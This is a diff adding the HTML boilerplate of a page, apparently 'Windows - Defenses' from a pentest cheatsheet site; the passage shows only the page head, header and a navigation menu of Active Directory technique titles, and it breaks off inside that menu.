@@ -1,0 +1,5413 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Active Directory and Internal Pentest Cheatsheets">
+      
+      
+      
+        <link rel="canonical" href="https://swisskyrepo.github.io/InternalAllTheThings/redteam/evasion/windows-defenses/">
+      
+      
+        <link rel="prev" href="../windows-amsi-bypass/">
+      
+      
+        <link rel="next" href="../windows-dpapi/">
+      
+      
+      <link rel="icon" href="../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.8">
+    
+    
+      
+        <title>Windows - Defenses - Internal All The Things</title>
+      
+    
+    
+	
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.8608ea7d.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+  <style>
+  .social-container {
+    float: right;
+  }
+  </style>
+
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../../custom.css">
+    
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+      
+        <meta  property="og:type"  content="website" >
+      
+        <meta  property="og:title"  content="Windows - Defenses - Internal All The Things" >
+      
+        <meta  property="og:description"  content="Active Directory and Internal Pentest Cheatsheets" >
+      
+        <meta  property="og:image"  content="https://swisskyrepo.github.io/InternalAllTheThings/assets/images/social/redteam/evasion/windows-defenses.png" >
+      
+        <meta  property="og:image:type"  content="image/png" >
+      
+        <meta  property="og:image:width"  content="1200" >
+      
+        <meta  property="og:image:height"  content="630" >
+      
+        <meta  property="og:url"  content="https://swisskyrepo.github.io/InternalAllTheThings/redteam/evasion/windows-defenses/" >
+      
+        <meta  name="twitter:card"  content="summary_large_image" >
+      
+        <meta  name="twitter:title"  content="Windows - Defenses - Internal All The Things" >
+      
+        <meta  name="twitter:description"  content="Active Directory and Internal Pentest Cheatsheets" >
+      
+        <meta  name="twitter:image"  content="https://swisskyrepo.github.io/InternalAllTheThings/assets/images/social/redteam/evasion/windows-defenses.png" >
+      
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#windows-defenses" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../.." title="Internal All The Things" class="md-header__button md-logo" aria-label="Internal All The Things" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Internal All The Things
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Windows - Defenses
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+          <a href="javascript:void(0)" class="md-search__icon md-icon" title="Share" aria-label="Share" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
+            
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"/></svg>
+          </a>
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/swisskyrepo/InternalAllTheThings" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8M97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+  </div>
+  <div class="md-source__repository">
+    GitHub
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../.." title="Internal All The Things" class="md-nav__button md-logo" aria-label="Internal All The Things" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    Internal All The Things
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/swisskyrepo/InternalAllTheThings" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8M97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+  </div>
+  <div class="md-source__repository">
+    GitHub
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../.." class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Internal All The Things
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../DISCLAIMER/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    DISCLAIMER
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Active directory
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            Active directory
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/ad-adcs-certificate-services/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Active Directory - Certificate Services
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/ad-adds-acl-ace/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Active Directory - Access Controls ACL/ACE
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/ad-adds-enumerate/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Active Directory - Enumeration
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/ad-adds-group-policy-objects/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Active Directory - Group Policy Objects
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/ad-adds-groups/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Active Directory - Groups
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/ad-adds-linux/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Active Directory - Linux
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/ad-adds-machineaccountquota/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Active Directory - Machine Account Quota
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/ad-adds-ntds-dumping/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Active Directory - NTDS Dumping
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/ad-adds-rodc/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Active Directory - Read Only Domain Controller
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/ad-adfs-federation-services/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Active Directory - Federation Services
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/ad-integrated-dns/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Active Directory - Integrated DNS - ADIDNS
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/ad-roasting-asrep/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Roasting - ASREP Roasting
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/ad-roasting-kerberoasting/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Roasting - Kerberoasting
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/ad-roasting-timeroasting/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Roasting - Timeroasting
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/ad-tricks/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Active Directory - Tricks
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/deployment-sccm/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Deployment - SCCM
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/deployment-wsus/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Deployment - WSUS
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/hash-capture/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Hash - Capture and Cracking
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/hash-over-pass-the-hash/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Hash - OverPass-the-Hash
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/hash-pass-the-hash/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Hash - Pass the Hash
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/hash-pass-the-key/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Hash - Pass The Key
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/internal-dcom/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Internal - DCOM
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/internal-pxe-boot-image/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Internal - PXE Boot Image
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/internal-relay-kerberos/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Internal - Kerberos Relay
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/internal-relay-ntlm/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Internal - NTLM Relay
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/internal-shares/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Internal - Shares
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/kerberos-bronze-bit/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Kerberos - Bronze Bit
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/kerberos-delegation-constrained/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Kerberos Delegation - Constrained Delegation
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/kerberos-delegation-rbcd/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Kerberos Delegation - Resource Based Constrained Delegation
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/kerberos-delegation-unconstrained/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Kerberos Delegation - Unconstrained Delegation
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/kerberos-s4u/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Kerberos - Service for User Extension
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/kerberos-tickets/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Kerberos - Tickets
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/pwd-comments/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Password - AD User Comment
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/pwd-dsrm-credentials/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Password - DSRM Credentials
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/pwd-group-policy-preferences/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Password - Group Policy Preferences
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/pwd-precreated-computer/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Password - Pre-Created Computer Account
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/pwd-read-gmsa/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Password - GMSA
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/pwd-read-laps/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Password - LAPS
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/pwd-shadow-credentials/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Password - Shadow Credentials
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/pwd-spraying/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Password - Spraying
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/trust-pam/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Trust - Privileged Access Management
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
